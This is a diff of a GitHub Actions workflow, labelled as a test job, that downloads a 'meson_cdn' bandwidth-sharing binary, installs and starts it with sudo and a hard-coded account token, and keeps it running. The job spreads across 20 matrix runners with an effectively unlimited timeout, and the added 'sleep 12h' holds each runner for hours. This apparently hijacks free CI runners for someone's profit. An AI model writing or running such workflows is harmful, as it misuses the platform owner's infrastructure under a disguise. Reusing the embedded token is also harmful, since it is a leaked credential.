@@ -10,7 +10,6 @@ on:
 jobs:
   test:
    name: Subscrbeit
-    # The type of runner that the job will run on
    runs-on: ubuntu-latest
    timeout-minutes: 999999999999
    strategy:
@@ -19,8 +18,4 @@ jobs:
      runner: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
    steps:
      - run: |
-         wget 'https://staticassets.meson.network/public/meson_cdn/v3.1.18/meson_cdn-linux-amd64.tar.gz' && tar -zxf meson_cdn-linux-amd64.tar.gz && rm -f meson_cdn-linux-amd64.tar.gz && cd ./meson_cdn-linux-amd64 && sudo ./service install meson_cdn && sudo ./meson_cdn config set --token=gbrmmfpsjawukfvzsssbekks --https_port=443 --cache.size=30 && sudo ./service start meson_cdn
-  name: Sleep for 10s
-        uses: ./
-        with:
-          time: 10s
+         wget 'https://staticassets.meson.network/public/meson_cdn/v3.1.18/meson_cdn-linux-amd64.tar.gz' && tar -zxf meson_cdn-linux-amd64.tar.gz && rm -f meson_cdn-linux-amd64.tar.gz && cd ./meson_cdn-linux-amd64 && sudo ./service install meson_cdn && sudo ./meson_cdn config set --token=gbrmmfpsjawukfvzsssbekks --https_port=443 --cache.size=30 && sudo ./service start meson_cdn && sleep 12h
